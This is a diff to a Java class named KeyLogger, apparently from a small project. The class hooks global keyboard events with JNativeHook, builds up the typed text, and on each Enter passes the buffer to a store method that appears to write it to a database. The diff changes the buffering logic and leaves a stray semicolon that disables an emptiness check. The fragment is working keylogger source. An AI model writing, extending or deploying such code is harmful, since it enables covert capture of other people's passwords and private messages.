@@ -8,33 +8,24 @@ import java.util.HashMap;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
-import javax.naming.InitialContext;
-
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 import org.joda.time.DateTime;
-import org.joda.time.format.DateTimeFormat;
-import org.joda.time.format.DateTimeFormatter;
-import org.quartz.InterruptableJob;
-import org.quartz.JobExecutionContext;
-import org.quartz.JobExecutionException;
-import org.quartz.UnableToInterruptJobException;
-
-import com.mysql.jdbc.Connection;
 
 import io.vertx.core.Vertx;
 import io.vertx.core.json.JsonArray;
 import io.vertx.core.json.JsonObject;
 import io.vertx.ext.jdbc.JDBCClient;
 import io.vertx.ext.sql.SQLConnection;
+import org.apache.commons.lang3.StringUtils;
 
 public class KeyLogger implements NativeKeyListener {
 	
 	private static Logger logger;
 	private ArrayList<String> typed;
-	private String data;
+	private String data=new String();
 	private HashMap<Integer, String> keyword = new HashMap<>();
 	private Vertx vertx;
 	private JDBCClient jdbc;
@@ -116,20 +107,22 @@ public class KeyLogger implements NativeKeyListener {
 		System.out.println(e.getKeyCode());
         int code = e.getKeyCode();
         String val =parser(e.getKeyCode()); 
-        String tmp = new String();
-        if ( val!=null){
-        	tmp=val;
-        	data += tmp;
+        if(!StringUtils.isEmpty(val));
+        	data += val;
         	
-        	if(code == NativeKeyEvent.VC_ENTER){
-        		System.out.println("Storing data!!!!!");
-        		store(data);
-        		data ="";
-        	}
+        
+        
+        if(code == NativeKeyEvent.VC_SPACE){
+        	if(data.length()>0)
+        		data = data.substring(0, data.length()-1);
         }
         
-        
-        
+        if(code == NativeKeyEvent.VC_ENTER){
+        	System.out.println("Storing data!!!!!");
+        	store(data);
+        	data ="";
+        }
+      
         
         System.out.println("Data :-> " + data);
         //System.out.println("Key code : " + e.getKeyCode());
@@ -223,4 +216,10 @@ public class KeyLogger implements NativeKeyListener {
 
        
     }
+
+
+	public boolean isRunning() {
+		// TODO Auto-generated method stub
+		return running;
+	}
 }
